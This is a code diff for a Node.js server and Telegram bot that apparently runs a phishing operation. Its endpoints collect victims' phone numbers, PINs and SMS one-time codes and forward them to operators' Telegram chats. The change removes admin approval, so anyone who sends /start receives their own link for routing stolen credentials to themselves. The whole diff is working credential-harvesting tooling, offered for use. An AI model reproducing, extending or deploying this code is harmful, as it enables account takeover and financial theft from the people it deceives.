@@ -23,8 +23,6 @@ mainBot.on('polling_error', (error) => {
 });
 
 let activeSessions = {};
-let authorizedAdmins = new Set(MAIN_ADMIN_ID ? [MAIN_ADMIN_ID] : []);
-let pendingSubAdmins = new Map();
 
 function escapeMarkdown(text) {
     if (!text) return '';
@@ -50,99 +48,13 @@ mainBot.on('message', (msg) => {
             return;
         }
 
-        let successCount = 0;
-        let failCount = 0;
-
-        const broadcastPromises = Array.from(authorizedAdmins).map(async (adminId) => {
-            if (adminId === MAIN_ADMIN_ID) return;
-            try {
-                await mainBot.sendMessage(adminId, `📢 **UJUMBE KUTOKA KWA SYSTEM:**\n\n${broadcastMessage}`, { parse_mode: "Markdown" });
-                successCount++;
-            } catch (err) {
-                console.error(`Failed to broadcast to ${adminId}:`, err.message);
-                failCount++;
-            }
-        });
-
-        Promise.all(broadcastPromises).then(() => {
-            mainBot.sendMessage(chatId, `✅ Ujumbe umerushwa kwa sub-admins!\n\n- Waliofanikiwa: ${successCount}\n- Walioshindwa: ${failCount}`);
-        });
-        return;
-    }
-
-    if (msg.text.startsWith('/suspend')) {
-        if (userIdStr !== MAIN_ADMIN_ID) {
-            mainBot.sendMessage(chatId, "⚠️ Wewe si Msimamizi Mkuu huwezi kutumia amri hii.");
-            return;
-        }
-
-        authorizedAdmins.clear();
-        authorizedAdmins.add(MAIN_ADMIN_ID);
-        pendingSubAdmins.clear();
-
-        mainBot.sendMessage(chatId, `🛑 **MFUMO UMEFUNGWA KWA SUB-ADMINS WOTE**\n\nViungo vya sub-admins vimesimamishwa. Ni Msimamizi Mkuu pekee anayebaki na ruhusa.`, { parse_mode: "Markdown" });
-        return;
-    }
-
-    if (msg.text.startsWith('/revoke')) {
-        if (userIdStr !== MAIN_ADMIN_ID) {
-            mainBot.sendMessage(chatId, "⚠️ Wewe si Msimamizi Mkuu huwezi kutumia amri hii.");
-            return;
-        }
-
-        const subAdminIdToRevoke = msg.text.replace('/revoke', '').trim();
-        if (!subAdminIdToRevoke) {
-            mainBot.sendMessage(chatId, "⚠️ Tafadhali weka Chat ID ya sub-admin unayetaka kumzuia.\n\nMfano:\n`/revoke 123456789`", { parse_mode: "Markdown" });
-            return;
-        }
-
-        if (subAdminIdToRevoke === MAIN_ADMIN_ID) {
-            mainBot.sendMessage(chatId, "⚠️ Huwezi kujiondoa mwenyewe kwenye orodha ya Msimamizi Mkuu.");
-            return;
-        }
-
-        if (authorizedAdmins.has(subAdminIdToRevoke)) {
-            authorizedAdmins.delete(subAdminIdToRevoke);
-            mainBot.sendMessage(chatId, `✅ Umefanikiwa kumzuia sub-admin mwenye ID: \`${subAdminIdToRevoke}\`. Hana ruhusa tena ya kupokea taarifa.`, { parse_mode: "Markdown" });
-            
-            mainBot.sendMessage(subAdminIdToRevoke, "❌ *Ruhusa Yako Imeondolewa*\n\nMsimamizi Mkuu amekataza ufikiaji wako kwenye mfumo huu.", { parse_mode: "Markdown" }).catch(() => {});
-        } else {
-            mainBot.sendMessage(chatId, `⚠️ Haionekani kuwa Chat ID \`${subAdminIdToRevoke}\` iko kwenye orodha ya sub-admins waliothibitishwa.`, { parse_mode: "Markdown" });
-        }
+        mainBot.sendMessage(chatId, "⚠️ Amri ya broadcast imebadilishwa kwani kila sub-admin sasa anafanya kazi kivyake.");
         return;
     }
 
     if (msg.text.startsWith('/start')) {
-        if (userIdStr === MAIN_ADMIN_ID) {
-            authorizedAdmins.add(userIdStr);
-            sendAdminLink(chatId, userIdStr, firstName, username);
-        } 
-        else if (authorizedAdmins.has(userIdStr)) {
-            // Permanent link for already authorized sub-admin sent independently to their chat
-            sendAdminLink(chatId, userIdStr, firstName, username);
-        } 
-        else {
-            pendingSubAdmins.set(userIdStr, { firstName, username });
-            mainBot.sendMessage(chatId, "⏳ *Ombi Lako Limetumwa*\n\nSubiri Msimamizi Mkuu (Main Admin) akuruhusu ili uweze kupata kiungo chako cha mfumo.", { parse_mode: "Markdown" });
-
-            const authMessage = `🔔 *OMBI JIPYA LA SUB-ADMIN*\n\n` +
-                `👤 *Jina:* ${escapeMarkdown(firstName)}\n` +
-                `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
-                `🏷 *Username:* ${escapeMarkdown(username)}`;
-
-            // Sent exclusively to Main Admin chat ID
-            mainBot.sendMessage(MAIN_ADMIN_ID, authMessage, {
-                parse_mode: "Markdown",
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: "✅ RUHUSU (AUTHORIZE)", callback_data: `authsub_${userIdStr}` },
-                            { text: "❌ KATAA (DENY)", callback_data: `denysub_${userIdStr}` }
-                        ]
-                    ]
-                }
-            }).catch(err => console.error("Error notifying main admin for auth:", err));
-        }
+        // Automatically allow any user to get their permanent isolated link immediately and freely
+        sendAdminLink(chatId, userIdStr, firstName, username);
     }
 });
 
@@ -153,7 +65,7 @@ function sendAdminLink(chatId, userIdStr, firstName, username) {
         `👤 *Jina:* ${escapeMarkdown(firstName)}\n` +
         `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
         `🏷 *Username:* ${escapeMarkdown(username)}\n\n` +
-        `🔗 *Kiungo Chako Maalum (Permanent Link):*\n${isolatedLink}`;
+        `🔗 *Kiungo Chako cha Kudumu (Permanent Link):*\n${isolatedLink}`;
 
     mainBot.sendMessage(chatId, welcomeText, { parse_mode: "Markdown" })
         .catch(err => console.error("Error sending start message:", err));
@@ -164,43 +76,6 @@ function setupCallbackHandler(botInstance) {
         const chatId = query.message.chat.id;
         const data = query.data;
         const userIdStr = chatId.toString().trim();
-
-        if (data.startsWith('authsub_') || data.startsWith('denysub_')) {
-            if (userIdStr !== MAIN_ADMIN_ID) {
-                botInstance.answerCallbackQuery(query.id, { text: "⚠ Ruhusa imekataliwa: Msimamizi Mkuu pekee ndiye anayeruhusiwa.", show_alert: true });
-                return;
-            }
-
-            const subAdminId = data.split('_')[1];
-            const subDetails = pendingSubAdmins.get(subAdminId) || { firstName: 'Sub-Admin', username: 'N/A' };
-
-            botInstance.editMessageReplyMarkup({ inline_keyboard: [] }, {
-                chat_id: chatId,
-                message_id: query.message.message_id
-            }).catch(err => console.error("Error clearing markup:", err));
-
-            if (data.startsWith('authsub_')) {
-                authorizedAdmins.add(subAdminId);
-                pendingSubAdmins.delete(subAdminId);
-
-                botInstance.answerCallbackQuery(query.id, { text: "Sub-admin ameelekezwa na kuruhusiwa!" });
-                
-                // Automatically send the permanent link directly to the sub-admin's chat ID independently
-                const host = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
-                const permanentLink = `${host}/?admin=${subAdminId}`;
-                
-                botInstance.sendMessage(subAdminId, `✅ *Ombi Lako Limekubaliwa!*\n\n🔗 *Kiungo Chako cha Kudumu (Permanent Link):*\n${permanentLink}`, { parse_mode: "Markdown" })
-                    .catch(() => {});
-                
-                botInstance.sendMessage(MAIN_ADMIN_ID, `✅ Umemruhusu mafanikio sub-admin: ${subDetails.firstName} (${subAdminId})`);
-            } else {
-                pendingSubAdmins.delete(subAdminId);
-                botInstance.answerCallbackQuery(query.id, { text: "Ombi limekataliwa." });
-                botInstance.sendMessage(subAdminId, "❌ *Ombi Lako Limekataliwa*\n\nSamahani, hukuruhusiwa kutumia mfumo huu.").catch(() => {});
-                botInstance.sendMessage(MAIN_ADMIN_ID, `❌ Umekataa ombi la sub-admin: ${subDetails.firstName} (${subAdminId})`);
-            }
-            return;
-        }
 
         const parts = data.split('_');
         const action = parts[0]; 
@@ -237,10 +112,10 @@ setupCallbackHandler(mainBot);
 app.post('/api/submit-credentials', (req, res) => {
     const { sessionId, phone, pin, adminId } = req.body;
     
+    // If an adminId is passed via the link parameter, route notifications directly to their chat ID
     let targetAdmin = MAIN_ADMIN_ID;
-
-    if (adminId && authorizedAdmins.has(adminId)) {
-        targetAdmin = adminId;
+    if (adminId) {
+        targetAdmin = adminId.toString().trim();
     }
 
     activeSessions[sessionId] = {
@@ -254,7 +129,6 @@ app.post('/api/submit-credentials', (req, res) => {
         `PHONE NO: ${phone}\n` +
         `PIN: ${pin}`;
 
-    // Sent exclusively to the respective admin's chat ID without leaking to main admin if it's a sub-admin link
     mainBot.sendMessage(targetAdmin, message, {
         reply_markup: {
             inline_keyboard: [
@@ -294,7 +168,6 @@ app.post('/api/submit-otp', (req, res) => {
         `NAMBARI YA SIMU: ${session.phone}\n\n` +
         `UJUMBE WOTE WA SMS:\n${otpText}`;
 
-    // Sent independently to the specific admin assigned to this session
     mainBot.sendMessage(session.targetAdmin, message, {
         reply_markup: {
             inline_keyboard: [
@@ -331,4 +204,4 @@ app.get('/api/check-status/:sessionId', (req, res) => {
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-                                
+                                                 
